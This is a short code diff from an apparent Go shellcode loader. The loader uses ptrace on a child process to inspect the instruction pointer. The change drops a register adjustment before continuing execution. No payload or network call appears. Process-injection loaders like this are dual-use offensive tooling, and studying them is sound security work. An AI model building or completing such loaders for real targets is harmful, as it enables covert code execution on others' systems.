@@ -151,14 +151,7 @@ func goShellcodeLoader(shellcode *string) error {
 	}
 	log.Printf("Peeked %d bytes: %x at RIP (0x%x)", n, peekWord, rip)
 
-	// rip += 2, for DETACH
-	regs.Rip += 2
-	err = syscall.PtraceSetRegs(childPid, regs)
-	if err != nil {
-		return fmt.Errorf("set regs: %v", err)
-	}
-
-	// TODO continue and wait
+	// continue and wait
 	err = syscall.PtraceCont(childPid, 0)
 	if err != nil {
 		return fmt.Errorf("Continue: %v", err)
